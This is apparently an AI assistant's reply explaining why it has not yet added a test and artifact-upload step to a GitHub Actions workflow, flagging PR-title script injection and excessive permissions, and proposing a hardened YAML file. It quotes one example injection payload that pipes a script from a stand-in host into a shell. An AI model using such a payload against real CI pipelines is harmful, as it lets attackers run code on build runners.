I haven't changed anything, for two reasons:

1. **The workflow has no tests or build to come after.** `.github/workflows/deploy.yml` only checks out the code and echoes the PR title. Nothing runs tests or produces an artifact, so there's no "after the tests pass" point to hook onto. The repo has `tests/test_balance.py` and `cmd/parser.go`, but I don't know which of these is meant to be built, or what file the build should produce.
2. **I can't edit files in this session.** I only have read and search tools here.

**Two security problems in the existing file, worth fixing at the same time:**

- **Line 14 lets a PR title run commands.** `${{ github.event.pull_request.title }}` is pasted into the shell script before it runs. A PR titled something like `"; curl evil.sh | sh; #` would run that command on the runner. The fix is to pass the title through an environment variable.
- **Line 7 gives the job far more access than it needs.** `permissions: write-all` grants write access to everything. Checking out code, testing and uploading an artifact only need `contents: read`.

Here's a version I'd suggest, assuming the tests are the Python suite. You'd need to fill in the build command and output path:

```yaml
---
name: deploy

on:
  pull_request:

permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Title is ${PR_TITLE}"
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: pip install pytest && pytest tests/
      - run: <your build command>          # e.g. produces dist/
      - uses: actions/upload-artifact@v4
        with:
          name: build
          path: dist/                       # adjust to your build output
          if-no-files-found: error
```

Steps run in order and the job stops at the first failure, so the upload only happens if the tests pass. Ideally, pin the actions to commit SHAs rather than version tags.

Tell me what the build command is, what file or folder it produces, and whether the tests are Python, Go, or both. Then I can finish the file, or you can apply it yourself if I still can't edit here.
